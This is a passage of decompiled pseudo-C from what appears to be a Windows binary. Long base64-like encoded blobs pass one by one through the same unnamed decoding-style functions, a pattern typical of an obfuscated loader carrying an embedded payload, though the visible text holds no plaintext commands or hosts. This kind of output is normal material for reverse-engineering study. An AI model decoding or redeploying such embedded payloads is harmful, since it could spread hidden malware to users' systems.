QvkqRrKEvHb2RvZNkJfNR61sWpOx29aaAEV0TVY9xNfAEw/qo2hPQo/wZjmWOQH3EXIC2Uxui+wM76+z/juIVR54v1IWKw0WJPMVSpWd37nmhqttHcSAhxEHiK7Z/j3z0HFzfM9FxbTvaztPrrUXRQBFAuHJlph/niYBU49vRZwznvcgVngWDmTMVAPV53qLzGgvA0DsLMpvFw3H+rqeAnLX85lNIMGx3Hx+pCEJHxhf0yiP39dr5h42DoCLc099EPPNB6mB2LL3CoLa9sxsmWN5YypbNewLRulXAiN9IBLLDFVhPpY/by6Cy14a7lnofSTukbvyzsaBjpnjxurCIr6nb2rP9LwH97B3zlrDEc44RPataq3eof7JwljmcETWKVpuNyVtxGsCulUoFvk6KKc8tMhfLs1FKtDr3MjejiDu7hIUi0nRIpHuxzEIkZ8lb9OnOm0V92brHao2ZK2nJBo0Ni/3CC+XxsN6V9+Pvsj6Rk1Jjo56NnAAW81NDB6moZhOFxRaPKZi7yCsptEwH/bNwf4vEw5orCDqy3NqjY1lwzo75X4Zxtk381y+vEkB/HHlXP0d5waYPjq8f2Eu9EASxqnozsnVWXZxJmdLU/K6BN8FdBgX956wMfYsRxtsAjy3zhinWw7yLc+na7TEos95S8L77/JSb98yz13xtRRsnmfi0MH/UcxyL0EkClWGOc9S+1+bTllzNVqorZRfrB8Ehe8L2xWKzUU2liy9Kt9nLWtl1KLaxB4qrC8NMFdst7LUjWNRV\"\n    ;\n    puStack468 = &stack0xfffffe68;\n    uStack472 = 0x4018c8;\n    puStack468 = fcn.004028d0();\n    uStack352 = CONCAT31(uStack352._1_3_, 0x16);\n    pcStack460 = *0x4295b4;\n    uStack464 = NULL;\n    uStack472 = 0x4018e2;\n    fcn.004022b0();\n    uStack472 = 1;\n    pcStack364 = pcStack364 & 0xffffff00;\n    pcStack476 = 0x4018f1;\n    fcn.004024b0();\n    uStack480 = &stack0xfffffe48;\n    pcStack476 = \n    \"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\"\n    ;\n    puStack484 = &stack0xfffffe58;\n    uStack488 = 0x401905;\n    puStack484 = fcn.004028d0();\n    uStack368 = CONCAT31(uStack368._1_3_, 0x17);\n    pcStack476 = *0x4295b4;\n    uStack480 = NULL;\n    uStack488 = 0x40191f;\n    fcn.004022b0();\n    uStack488 = 1;\n    pcStack380 = pcStack380 & 0xffffff00;\n    pcStack492 = 0x40192e;\n    fcn.004024b0();\n    uStack496 = &stack0xfffffe38;\n    pcStack492 = \n    \"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\"\n    ;\n    puStack500 = &stack0xfffffe48;\n    uStack504 = 0x401942;\n    puStack500 = fcn.004028d0();\n    uStack384 = CONCAT31(uStack384._1_3_, 0x18);\n    pcStack492 = *0x4295b4;\n    uStack496 = NULL;\n    uStack504 = 0x40195c;\n    fcn.004022b0();\n    uStack504 = 1;\n    pcStack396 = pcStack396 & 0xffffff00;\n    pcStack508 = 0x40196b;\n    fcn.004024b0();\n    uStack512 = &stack0xfffffe28;\n    pcStack508 = \n    \"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\"\n    ;\n    puStack516 = &stack0xfffffe38;\n    uStack520 = 0x40197f;\n    puStack516 = fcn.004028d0();\n    uStack400 = CONCAT31(uStack400._1_3_, 0x19);\n    pcStack508 = *0x4295b4;\n    uStack512 = NULL;\n    uStack520 = 0x401999;\n    fcn.004022b0();\n    uStack520 = 1;\n    pcStack412 = pcStack412 & 0xffffff00;\n    pcStack524 = 0x4019a8;\n    fcn.004024b0();\n    uStack528 = &stack0xfffffe18;\n    pcStack524 = \n    \"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\"\n    ;\n    puStack532 = &stack0xfffffe28;\n    uStack536 = 0x4019bc;\n    puStack532 = fcn.004028d0();\n    uStack416 = CONCAT31(uStack416._1_3_, 0x1a);\n    pcStack524 = *0x4295b4;\n    uStack528 = NULL;\n    uStack536 = 0x4019d6;\n    fcn.004022b0();\n    uStack536 = 1;\n    pcStack428 = pcStack428 & 0xffffff00;\n    pcStack540 = 0x4019e5;\n    fcn.004024b0();\n    uStack544 = &stack0xfffffe08;\n    pcStack540 = \n    \"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\"\n    ;\n    puStack548 = &stack0xfffffe18;\n    uStack552 = 0x4019f9;\n    puStack548 = fcn.004028d0();\n    uStack432 = CONCAT31(uStack432._1_3_, 0x1b);\n    pcStack540 = *0x4295b4;\n    uStack544 = NULL;\n    uStack552 = 0x401a13;\n    fcn.004022b0();\n    uStack552 = 1;\n    pcStack444 = pcStack444 & 0xffffff00;\n    pcStack556 = 0x401a22;\n    fcn.004024b0();\n    uStack560 = &stack0xfffffdf8;\n    pcStack556 = \n    \"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\"\n    ;\n    puStack564 = &stack0xfffffe08;\n    uStack568 = 0x401a36;\n    puStack564 = fcn.004028d0();\n    uStack448 = CONCAT31(uStack448._1_3_, 0x1c);\n    pcStack556 = *0x4295b4;\n    uStack560 = NULL;\n    uStack568 = 0x401a50;\n    fcn.004022b0();\n    uStack568 = 1;\n    pcStack460 = pcStack460 & 0xffffff00;\n    pcStack572 = 0x401a5f;\n    fcn.004024b0();\n    uStack576 = &stack0xfffffde8;\n    pcStack572 = \n    \"PYR/qmkEiAfM6+TG/R/fa2svbAwH5/0LKWfi1EYVpDVRiGXVVhuTNAHGERxpvKuQZiWayXdyxuxfzUBusWJGHOhdxzENsc9tzd693U3QJKaQyKf234Nq+S/4NtKf2MbRtm/en0my8b2Rhe/xFjcaz6XWralDWglLsIdQUpKZq7KzRW+3bx0f24Vdz85Fs11OhUibrzlVZYsVLc8lg5r7yELlWG9pAVOS7yBZsNdHUa8nGVhEQ/7rHJT3rdqTXas9wzLCcefMn3fJ0V1oQ92DOh3uNPFSjBdqvJ8BkR09FcD+8oOjIngifasKQYmsLAeemC0QS8kzrcNq0nM6Utxpt3tcMErCtO4JxsQv0IbW/+mVI2c/0Lk4awIevfKQH9XF6UPrE32JneqPCx4gAh/ZqOBfXZuFiso54i5LixZvX1nnk6nAJKXxAEG4C9wj5bWlsjhqsqlrKXiUAV3STw/w/6uCF4MmnjhSyduihgV+0ycinyaE4rCpiAJV3ug8y81q3KMHR9dpwnCNmifKL0+u2ZPaUX6w1dBvxfGHyydX6wXJWRLITZX1tS2LVsvucYfmHCDKmwLCxtpv/7/6ykGIrGp4lmeQuim/Bxt0aP2qvoybzcQXXROsZ9fvZnNzsTQ3HyMVWik54j3WU1ehCwkke0v1XgW0zzNExqOyOuPQCdc4fOPEKL3PnGedq0zyh1z2y2ZBeKL5nweHw82Z2ee8GIzEYwW3/ek1jSSvszksHxdIutd8Kd+73Dn5jKcpztmyt7z+iCA6mm478JCn30vs2JuQwZnE2EKHOHk7BNbHdfyIVF9DhJN3nq3nwWezqJVKysRv6gWtbCOEy4iFrcULkWL0OkLg8+wqdy2O2Zsm/w3TaB+f9HW9dI/Ee4180//FzCv2Ewt148uO0TNC02pVipxdgbGH+p5TxejYHvem50J6KMmqLyhC8fe8eHusqc9IoNR3WYiJt7Dpvo7AAIZ67y/m64mKkUIEXmUo9ELaRaHZjqmETZ+M7cALjTafloVcgmOSj1x4O1nNlinAnoO775208TQRCQn7yequs4JBWFdOnasI8Uu0wa1KY9exPu3Mt83ipszgMVnU7LZRu3vNXta0YijjEjfy76GiTRgZRUQyLbykEZow0IK4gxEcAhXyY567omnye2vbGZnVIbllVUM9rq2M3eP8f0wSE8dxhUFzaWKRrrspeSDFuxRN9I6UvfDZzm/BXF3dK6c0o9jEtkfqktdaDRI9h